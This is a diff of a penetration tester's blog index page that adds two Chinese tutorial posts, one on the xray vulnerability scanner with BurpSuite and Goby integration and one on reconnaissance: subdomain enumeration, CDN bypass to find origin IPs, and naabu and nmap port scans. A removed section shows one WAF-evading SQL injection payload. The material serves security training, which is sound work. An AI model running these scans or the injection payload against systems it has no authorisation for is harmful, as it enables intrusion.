@@ -176,18 +176,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-count">22</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-count">20</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">116</span>
+        <span class="site-state-item-count">119</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -212,6 +212,359 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/09/20/tools/2026-09-20-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/private/icon1.png">
+      <meta itemprop="name" content="Byron">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Byron">
+      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Byron">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/09/20/tools/2026-09-20-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" class="post-title-link" itemprop="url">漏洞扫描工具</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-09-20 22:00:00" itemprop="dateCreated datePublished" datetime="2026-09-20T22:00:00+08:00">2026-09-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-10-15 11:05:20" itemprop="dateModified" datetime="2026-10-15T11:05:20+08:00">2026-10-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/tools/" itemprop="url" rel="index"><span itemprop="name">tools</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/tools/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">漏洞扫描工具</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <hr>
+<h2 id="1-0-漏洞扫描工具"><a href="#1-0-漏洞扫描工具" class="headerlink" title="1.0 漏洞扫描工具"></a>1.0 漏洞扫描工具</h2><blockquote>
+<p>漏洞扫描器是一种安全工具, 能够自动扫描计算机, 网络, 或应用程序中的安全漏洞</p>
+<p>使用自动化技术执行漏洞扫描, 并生成报告</p>
+</blockquote>
+<hr>
+<h3 id="1-1-xray"><a href="#1-1-xray" class="headerlink" title="1.1 xray"></a>1.1 xray</h3><p>特点:</p>
+<ol>
+<li>检测速率快, 算法效率高</li>
+<li>支持范围广, 支持OWASP Top 10, 以及各种CMS</li>
+<li>定位为辅助评估工具, 内置payload, POC均为无害检查</li>
+</ol>
+<p>使用方式:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用cli方式运行 (只做子域名扫描)</span></span><br><span class="line">./xray_windows_amd64.exe subdomain <span class="literal">--target</span> target.com <span class="literal">--html-output</span> test.html</span><br><span class="line">                                  <span class="comment"># 目标               # 输出报告格式 文件名 </span></span><br></pre></td></tr></table></figure>
+
+<h5 id="01-爬虫模式"><a href="#01-爬虫模式" class="headerlink" title="01 爬虫模式"></a>01 爬虫模式</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray_windows_amd64.exe webscan <span class="literal">--basic-crawler</span> http://xxx.com/ <span class="literal">--html-output</span> xx.html</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>必须是完整的URL http:&#x2F;&#x2F; + 域名</p>
+</blockquote>
+<h5 id="02-代理模式"><a href="#02-代理模式" class="headerlink" title="02 代理模式"></a>02 代理模式</h5><p>架构: 扫描器作为中间人, 首先原样转发流量, 并返回服务器响应给浏览器等客户端, 通讯两端都认为自己直接与对方对话, 同时记录该流量, 然后修改参数并重新发送请求进行扫描</p>
+<ol>
+<li><p>在浏览器使用 https 协议通信的情况下, 必须要得到客户端的信任, 才能建立与客户端的通信. 生<br>成证书:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray_windows_amd64.exe genca</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将生成的证书ca.crt安装到浏览器, 与Burp Suite的证书安装方法一样. </p>
+</li>
+<li><p>启动xray代理模式</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray_windows_amd64.exe webscan <span class="literal">--listen</span> <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">7777</span> <span class="literal">--html-output</span> listen.html</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>浏览器新建一个xray代理</p>
+<ul>
+<li>代理协议: HTTP</li>
+<li>代理服务器: 127.0.0.1</li>
+<li>代理端口: 7777</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="1-2-xray-联动-BurpSuite"><a href="#1-2-xray-联动-BurpSuite" class="headerlink" title="1.2 xray 联动 BurpSuite"></a>1.2 xray 联动 BurpSuite</h3><p><img data-src="/2026/09/20/tools/2026-09-20-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/1.png"></p>
+<blockquote>
+<p>此时浏览器代理走BurpSuite</p>
+</blockquote>
+<hr>
+<h3 id="1-3-xray-联动-Goby"><a href="#1-3-xray-联动-Goby" class="headerlink" title="1.3 xray 联动 Goby"></a>1.3 xray 联动 Goby</h3><p>01 Goby内下载xray插件</p>
+<p>02 下载rad_windows_amd64.exe 放置在xray根目录</p>
+<p>03 配置Goby-xray 插件 Report路径</p>
+<p><img data-src="/2026/09/20/tools/2026-09-20-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/2.png"></p>
+<p>04 将xray配置文件复制一份到Goby根目录</p>
+<p><img data-src="/2026/09/20/tools/2026-09-20-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/3.png"></p>
+<p>05 新建扫描</p>
+<p><img data-src="/2026/09/20/tools/2026-09-20-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/4.png"></p>
+<hr>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/09/14/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/2026-09-18-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/private/icon1.png">
+      <meta itemprop="name" content="Byron">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Byron">
+      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Byron">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/09/14/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/2026-09-18-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="post-title-link" itemprop="url">信息收集</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-09-14 22:00:00" itemprop="dateCreated datePublished" datetime="2026-09-14T22:00:00+08:00">2026-09-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-09-21 15:30:17" itemprop="dateModified" datetime="2026-09-21T15:30:17+08:00">2026-09-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" itemprop="url" rel="index"><span itemprop="name">信息收集</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="1-0-信息收集"><a href="#1-0-信息收集" class="headerlink" title="1.0 信息收集"></a>1.0 信息收集</h2><blockquote>
+<p>本文详细梳理信息收集全流程</p>
+</blockquote>
+<hr>
+<p>给我一个公司名, xx有限公司, 应该怎样去做信息收集?</p>
+<h3 id="1-1-企业主体与主域名确认"><a href="#1-1-企业主体与主域名确认" class="headerlink" title="1.1 企业主体与主域名确认"></a>1.1 企业主体与主域名确认</h3><ol>
+<li><p>企查查, 天眼查;</p>
+</li>
+<li><p>工信部服务平台</p>
+<p>…</p>
+</li>
+</ol>
+<p>信息整理:</p>
+<table>
+<thead>
+<tr>
+<th>主体</th>
+<th>备案号</th>
+<th>主域名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>xx有限公司</td>
+<td>ICP备xx..</td>
+<td>target.com</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="1-2-子域名信息收集"><a href="#1-2-子域名信息收集" class="headerlink" title="1.2 子域名信息收集"></a>1.2 子域名信息收集</h3><ol>
+<li>FOFA</li>
+<li>搜索引擎语法<ul>
+<li>site:target.com</li>
+</ul>
+</li>
+<li>子域名挖掘工具:<ul>
+<li>OneForAll<ul>
+<li>主动+被动</li>
+<li>结果更全, 但是慢</li>
+<li>自带解析</li>
+</ul>
+</li>
+<li>subfinder<ul>
+<li>被动收集, 只查不扫, 不会触发WAF</li>
+<li>速度快, 适合批量扫描</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li><p>FOFA 子域名收集: (以百度为例)</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">domain</span><span class="operator">=</span><span class="string">&quot;baidu.com&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/09/14/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/2026-09-18-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/1.png"></p>
+</li>
+<li><p>OneForAll</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uv run oneforall.py --target target.com run</span><br><span class="line">uv run oneforall.py --targets domain.txt run <span class="comment"># 读文件</span></span><br><span class="line"><span class="comment"># 结果在 results下</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>subfinder</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">subfinder -d target.com</span><br><span class="line">subfinder -d target.com -o subs.txt        <span class="comment"># 输出结果到文件</span></span><br><span class="line">subfinder -dL domains.txt -o all_subs.txt  <span class="comment"># 从文件读</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<h3 id="1-3-小程序-APP信息收集"><a href="#1-3-小程序-APP信息收集" class="headerlink" title="1.3 小程序&amp;APP信息收集"></a>1.3 小程序&amp;APP信息收集</h3><ol>
+<li>通过小蓝本进行收集</li>
+<li>工信部服务平台</li>
+</ol>
+<hr>
+<h3 id="1-4-存活探测"><a href="#1-4-存活探测" class="headerlink" title="1.4 存活探测"></a>1.4 存活探测</h3><blockquote>
+<p>子域名拉取后, 存在大量死链, 下一步进行资产过滤</p>
+</blockquote>
+<ul>
+<li><p>httpx</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基础用法: 只看哪些域名活了</span></span><br><span class="line"><span class="built_in">cat</span> subs.txt | httpx -silent</span><br><span class="line"><span class="comment"># 带状态码, 标题, 技术栈(常用)</span></span><br><span class="line"><span class="built_in">cat</span> subs.txt | httpx -silent -sc -title -tech-detect</span><br><span class="line"><span class="comment"># 输出到文件</span></span><br><span class="line"><span class="built_in">cat</span> subs.txt | httpx -silent -sc -title -o live.txt</span><br><span class="line">httpx -l subs.txt -silent -sc -title -tech-detect -o live.txt (更常用)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<h3 id="1-5-指纹识别"><a href="#1-5-指纹识别" class="headerlink" title="1.5 指纹识别"></a>1.5 指纹识别</h3><ol>
+<li>浏览器插件 Wappalyzer</li>
+<li>httpx 批量识别 (-tech-detect)</li>
+</ol>
+<hr>
+<h3 id="1-6-真实IP收集"><a href="#1-6-真实IP收集" class="headerlink" title="1.6 真实IP收集"></a>1.6 真实IP收集</h3><p><strong>如何判断网站使用了CDN?</strong></p>
+<ol>
+<li><p>多地Ping: 若IP结果不唯一, 则使用了CDN</p>
+</li>
+<li><p>DNS解析: 返回多个IP</p>
+</li>
+<li><p>HTTP响应头分析: 使用 <code>curl -I</code> 查看响应头, 出现 <code>Server: cloudflare</code>, <code>X-Cache</code> 等字段</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 站长工具</span><br><span class="line">https://ping.chinaz.com/</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><strong>如何绕过CDN?</strong></p>
+<ol>
+<li><p>很多网站只对主站或者高流量子站做CDN, 若使用真实IP的子站和主站处于同一个服务器或者C段, 则可通过子站IP辅助查找主站真实IP</p>
+</li>
+<li><p>历史DNS记录</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 微步</span><br><span class="line">https://x.threatbook.com/</span><br><span class="line"># ip138</span><br><span class="line">https://www.ip138.com/</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>国外访问</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ping.pe/</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>邮箱服务: 查看邮件头 <code>Received</code> 字段</p>
+</li>
+</ol>
+<hr>
+<h3 id="1-7-端口信息收集"><a href="#1-7-端口信息收集" class="headerlink" title="1.7 端口信息收集"></a>1.7 端口信息收集</h3><blockquote>
+<p>目标: 在存活资产基础上发现开放端口, 为服务识别和 Web 入口扩展做准备<br>原则: 先快后慢, 先全后精, 控制速率</p>
+</blockquote>
+<p><strong>扫描策略:</strong></p>
+<ul>
+<li>先对存活 IP 做常见端口快速扫描</li>
+<li>再对重点 IP 做全端口扫描</li>
+<li>最后用 nmap 对开放端口做精细识别</li>
+<li>CDN&#x2F;WAF 资产先尝试找真实 IP, 再扫端口</li>
+<li>非标端口发现后, 重新用 httpx 探测 Web 服务</li>
+</ul>
+<p><strong>常用工具:</strong></p>
+<p>naabu: 快速对全端口进行扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 常见端口快速扫描</span></span><br><span class="line">naabu -l live_ips.txt -top-ports 1000 -rate 1000 -o common_ports.txt</span><br><span class="line"><span class="comment"># 2. 重点 IP 全端口扫描</span></span><br><span class="line">naabu -l key_ips.txt -p - -rate 1000 -o all_ports.txt</span><br></pre></td></tr></table></figure>
+
+<p>nmap 精细识别</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常见 Web 端口</span></span><br><span class="line">nmap -sV -sC -Pn -iL live_ips.txt -p 80,443,8080,8443,8000,9000,9443 -oA nmap_web</span><br><span class="line"><span class="comment"># 全端口精细扫描，速度较慢</span></span><br><span class="line">nmap -sV -sC -Pn -p- --min-rate 1000 -iL live_ips.txt -oA nmap_full</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="1-8-Web信息收集"><a href="#1-8-Web信息收集" class="headerlink" title="1.8 Web信息收集"></a>1.8 Web信息收集</h3><p>目录信息收集:</p>
+<p>dirsearch工具</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u https://target.com -e *</span><br></pre></td></tr></table></figure>
+
+<p>浏览器插件FindSomething</p>
+<hr>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -436,218 +789,6 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union/*/-*!!*/select 1,database/*/-*!!*/(),3--+</span><br></pre></td></tr></table></figure>
 
 <p><img data-src="/2026/09/14/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E4%BD%93%E7%B3%BB/2026-09-14-WAF/10.png"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/09/14/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/2026-09-18-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/private/icon1.png">
-      <meta itemprop="name" content="Byron">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Byron">
-      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Byron">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/09/14/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/2026-09-18-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="post-title-link" itemprop="url">信息收集</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-09-14 22:00:00" itemprop="dateCreated datePublished" datetime="2026-09-14T22:00:00+08:00">2026-09-14</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-21 15:30:17" itemprop="dateModified" datetime="2026-09-21T15:30:17+08:00">2026-09-21</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" itemprop="url" rel="index"><span itemprop="name">信息收集</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="1-0-信息收集"><a href="#1-0-信息收集" class="headerlink" title="1.0 信息收集"></a>1.0 信息收集</h2><blockquote>
-<p>本文详细梳理信息收集全流程</p>
-</blockquote>
-<hr>
-<p>给我一个公司名, xx有限公司, 应该怎样去做信息收集?</p>
-<h3 id="1-1-企业主体与主域名确认"><a href="#1-1-企业主体与主域名确认" class="headerlink" title="1.1 企业主体与主域名确认"></a>1.1 企业主体与主域名确认</h3><ol>
-<li><p>企查查, 天眼查;</p>
-</li>
-<li><p>工信部服务平台</p>
-<p>…</p>
-</li>
-</ol>
-<p>信息整理:</p>
-<table>
-<thead>
-<tr>
-<th>主体</th>
-<th>备案号</th>
-<th>主域名</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>xx有限公司</td>
-<td>ICP备xx..</td>
-<td>target.com</td>
-</tr>
-</tbody></table>
-<hr>
-<h3 id="1-2-子域名信息收集"><a href="#1-2-子域名信息收集" class="headerlink" title="1.2 子域名信息收集"></a>1.2 子域名信息收集</h3><ol>
-<li>FOFA</li>
-<li>搜索引擎语法<ul>
-<li>site:target.com</li>
-</ul>
-</li>
-<li>子域名挖掘工具:<ul>
-<li>OneForAll<ul>
-<li>主动+被动</li>
-<li>结果更全, 但是慢</li>
-<li>自带解析</li>
-</ul>
-</li>
-<li>subfinder<ul>
-<li>被动收集, 只查不扫, 不会触发WAF</li>
-<li>速度快, 适合批量扫描</li>
-</ul>
-</li>
-</ul>
-</li>
-</ol>
-<ul>
-<li><p>FOFA 子域名收集: (以百度为例)</p>
-<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">domain</span><span class="operator">=</span><span class="string">&quot;baidu.com&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/2026/09/14/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/2026-09-18-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/1.png"></p>
-</li>
-<li><p>OneForAll</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uv run oneforall.py --target target.com run</span><br><span class="line">uv run oneforall.py --targets domain.txt run <span class="comment"># 读文件</span></span><br><span class="line"><span class="comment"># 结果在 results下</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>subfinder</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">subfinder -d target.com</span><br><span class="line">subfinder -d target.com -o subs.txt        <span class="comment"># 输出结果到文件</span></span><br><span class="line">subfinder -dL domains.txt -o all_subs.txt  <span class="comment"># 从文件读</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-<hr>
-<h3 id="1-3-小程序-APP信息收集"><a href="#1-3-小程序-APP信息收集" class="headerlink" title="1.3 小程序&amp;APP信息收集"></a>1.3 小程序&amp;APP信息收集</h3><ol>
-<li>通过小蓝本进行收集</li>
-<li>工信部服务平台</li>
-</ol>
-<hr>
-<h3 id="1-4-存活探测"><a href="#1-4-存活探测" class="headerlink" title="1.4 存活探测"></a>1.4 存活探测</h3><blockquote>
-<p>子域名拉取后, 存在大量死链, 下一步进行资产过滤</p>
-</blockquote>
-<ul>
-<li><p>httpx</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基础用法: 只看哪些域名活了</span></span><br><span class="line"><span class="built_in">cat</span> subs.txt | httpx -silent</span><br><span class="line"><span class="comment"># 带状态码, 标题, 技术栈(常用)</span></span><br><span class="line"><span class="built_in">cat</span> subs.txt | httpx -silent -sc -title -tech-detect</span><br><span class="line"><span class="comment"># 输出到文件</span></span><br><span class="line"><span class="built_in">cat</span> subs.txt | httpx -silent -sc -title -o live.txt</span><br><span class="line">httpx -l subs.txt -silent -sc -title -tech-detect -o live.txt (更常用)</span><br></pre></td></tr></table></figure></li>
-</ul>
-<hr>
-<h3 id="1-5-指纹识别"><a href="#1-5-指纹识别" class="headerlink" title="1.5 指纹识别"></a>1.5 指纹识别</h3><ol>
-<li>浏览器插件 Wappalyzer</li>
-<li>httpx 批量识别 (-tech-detect)</li>
-</ol>
-<hr>
-<h3 id="1-6-真实IP收集"><a href="#1-6-真实IP收集" class="headerlink" title="1.6 真实IP收集"></a>1.6 真实IP收集</h3><p><strong>如何判断网站使用了CDN?</strong></p>
-<ol>
-<li><p>多地Ping: 若IP结果不唯一, 则使用了CDN</p>
-</li>
-<li><p>DNS解析: 返回多个IP</p>
-</li>
-<li><p>HTTP响应头分析: 使用 <code>curl -I</code> 查看响应头, 出现 <code>Server: cloudflare</code>, <code>X-Cache</code> 等字段</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 站长工具</span><br><span class="line">https://ping.chinaz.com/</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p><strong>如何绕过CDN?</strong></p>
-<ol>
-<li><p>很多网站只对主站或者高流量子站做CDN, 若使用真实IP的子站和主站处于同一个服务器或者C段, 则可通过子站IP辅助查找主站真实IP</p>
-</li>
-<li><p>历史DNS记录</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 微步</span><br><span class="line">https://x.threatbook.com/</span><br><span class="line"># ip138</span><br><span class="line">https://www.ip138.com/</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>国外访问</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ping.pe/</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>邮箱服务: 查看邮件头 <code>Received</code> 字段</p>
-</li>
-</ol>
-<hr>
-<h3 id="1-7-端口信息收集"><a href="#1-7-端口信息收集" class="headerlink" title="1.7 端口信息收集"></a>1.7 端口信息收集</h3><blockquote>
-<p>目标: 在存活资产基础上发现开放端口, 为服务识别和 Web 入口扩展做准备<br>原则: 先快后慢, 先全后精, 控制速率</p>
-</blockquote>
-<p><strong>扫描策略:</strong></p>
-<ul>
-<li>先对存活 IP 做常见端口快速扫描</li>
-<li>再对重点 IP 做全端口扫描</li>
-<li>最后用 nmap 对开放端口做精细识别</li>
-<li>CDN&#x2F;WAF 资产先尝试找真实 IP, 再扫端口</li>
-<li>非标端口发现后, 重新用 httpx 探测 Web 服务</li>
-</ul>
-<p><strong>常用工具:</strong></p>
-<p>naabu: 快速对全端口进行扫描</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 常见端口快速扫描</span></span><br><span class="line">naabu -l live_ips.txt -top-ports 1000 -rate 1000 -o common_ports.txt</span><br><span class="line"><span class="comment"># 2. 重点 IP 全端口扫描</span></span><br><span class="line">naabu -l key_ips.txt -p - -rate 1000 -o all_ports.txt</span><br></pre></td></tr></table></figure>
-
-<p>nmap 精细识别</p>
